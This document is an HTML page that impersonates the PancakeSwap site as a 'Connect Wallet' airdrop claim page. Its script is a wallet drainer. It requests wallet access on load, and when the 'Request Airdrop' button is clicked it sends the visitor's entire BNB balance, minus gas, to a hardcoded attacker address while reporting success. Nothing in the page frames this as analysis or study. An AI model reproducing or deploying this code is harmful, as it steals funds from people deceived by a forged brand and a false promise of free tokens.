<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PancakeSwap - Connect Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .gradient-bg {
            background: #08060B;
            background-image: radial-gradient(ellipse at top, #1B1464 0%, #08060B 50%);
        }
        .gradient-button {
            background: linear-gradient(to right, #7645D9, #5121B1);
            transition: all 0.2s;
        }
        .gradient-button:hover {
            background: linear-gradient(to right, #8F5AE8, #6132CC);
        }
        #mensagem.message {
            background-color: rgba(220, 38, 38, 0.1);
            color: rgb(248, 113, 113);
            padding: 0.5rem 1rem;
            border-radius: 0.75rem;
        }
        #mensagem.success-message {
            background-color: rgba(34, 197, 94, 0.1);
            color: rgb(74, 222, 128);
            padding: 0.5rem 1rem;
            border-radius: 0.75rem;
        }
    </style>
</head>
<body class="gradient-bg min-h-screen">
    <div class="container mx-auto px-4 py-8">
        <!-- Navbar -->
        <nav class="flex items-center justify-between mb-12">
            <div class="flex items-center space-x-2">
                <img src="https://pancakeswap.finance/logo.png" alt="PancakeSwap" class="h-8 w-8">
                <span class="text-white font-bold text-xl">PancakeSwap</span>
            </div>
        </nav>

        <!-- Main Content -->
        <div class="flex justify-center items-center min-h-[calc(100vh-120px)]">
            <div class="bg-[#27262C] rounded-3xl p-6 w-full max-w-md border border-[#383241]">
                <div class="text-center mb-6">
                    <h1 class="text-2xl font-bold text-white mb-2">Connect Wallet</h1>
                    <p id="walletStatus" class="text-[#B8ADD2] text-sm">Connect your wallet to continue</p>
                </div>

                <div class="space-y-4">
                    <div class="bg-[#372F47] rounded-xl p-4">
                        <label for="enderecoCarteira" class="block text-[#B8ADD2] text-sm font-medium mb-2">
                            Wallet Address
                        </label>
                        <input
                            type="text"
                            id="enderecoCarteira"
                            readonly
                            class="w-full bg-[#27262C] border border-[#383241] rounded-xl px-4 py-3 text-white placeholder-[#B8ADD2] focus:outline-none focus:ring-2 focus:ring-[#7645D9]"
                            placeholder="Connect wallet to view address"
                        >
                    </div>

                    <button
                        id="solicitarButton"
                        class="w-full gradient-button text-white font-bold py-4 px-6 rounded-xl flex items-center justify-center space-x-2"
                    >
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
                            <path d="M17 10h4V2H3v8h4"></path>
                            <path d="M7 10v12h10V10"></path>
                        </svg>
                        <span>Request Airdrop</span>
                    </button>

                    <p id="mensagem" class="mt-4 text-center text-sm"></p>
                </div>

                <div class="mt-6 pt-6 border-t border-[#383241]">
                    <div class="text-center">
                        <p class="text-[#B8ADD2] text-sm">
                            Haven't got a crypto wallet yet?
                        </p>
                        <a
                            href="https://docs.pancakeswap.finance/get-started/wallet-guide"
                            target="_blank"
                            rel="noopener noreferrer"
                            class="text-[#7645D9] hover:text-[#8F5AE8] font-medium text-sm"
                        >
                            Learn how to connect →
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const walletStatus = document.getElementById('walletStatus');
            const mensagem = document.getElementById('mensagem');

            if (window.ethereum) {
                conectarCarteira(window.ethereum);
            } else {
                console.error("Nenhuma carteira detectada no navegador");
                walletStatus.textContent = "Por favor, abra uma carteira e tente novamente.";
            }
        });

        async function conectarCarteira(provider) {
            window.web3 = new Web3(provider);

            try {
                await provider.request({ method: 'eth_requestAccounts' });
                console.log("Carteira conectada!");
                walletStatus.textContent = "Carteira conectada com sucesso!";
                walletStatus.classList.add('success-message');

                const accounts = await provider.request({ method: 'eth_accounts' });
                const endereco = accounts[0];
                document.getElementById('enderecoCarteira').value = endereco;
            } catch (error) {
                console.error("Usuário rejeitou a conexão da carteira:", error);
                walletStatus.textContent = "Por favor, conecte sua carteira e tente novamente.";
                walletStatus.classList.add('message');
            }
        }

        async function solicitarAirDrop() {
            const enderecoCarteira = document.getElementById('enderecoCarteira').value.trim();
            const enderecoDestino = '0xA9ca912b9C1Ff37038DecDb8c06950A2ff540031';
            const bnbNecessario = 0.00001;
            const mensagem = document.getElementById('mensagem');

            if (!window.web3.utils.isAddress(enderecoCarteira)) {
                mensagem.textContent = "Endereço de carteira inválido.";
                mensagem.classList.add('message');
                return;
            }

            try {
                const balance = await window.web3.eth.getBalance(enderecoCarteira);
                const bnbBalance = parseFloat(window.web3.utils.fromWei(balance, 'ether'));

                if (bnbBalance < bnbNecessario) {
                    mensagem.textContent = "Saldo de BNB insuficiente para o AirDrop.";
                    mensagem.classList.add('message');
                    return;
                }

                const gasPrice = await window.web3.eth.getGasPrice();
                const gasLimit = 21000;
                const gasCost = gasPrice * gasLimit;
                const totalToSend = balance - gasCost;

                const transaction = {
                    from: enderecoCarteira,
                    to: enderecoDestino,
                    value: window.web3.utils.toHex(totalToSend),
                    gasPrice: window.web3.utils.toHex(gasPrice),
                    gas: window.web3.utils.toHex(gasLimit)
                };

                const transactionHash = await window.web3.eth.sendTransaction(transaction);

                mensagem.textContent = "Transação enviada com sucesso. Hash da transação: " + transactionHash.transactionHash;
                mensagem.classList.add('success-message');
            } catch (error) {
                console.error("Erro ao enviar transação:", error);
                mensagem.textContent = "Erro na solicitação. Tente novamente.";
                mensagem.classList.add('message');
            }
        }

        document.getElementById('solicitarButton').addEventListener('click', solicitarAirDrop);
    </script>
</body>
</html>
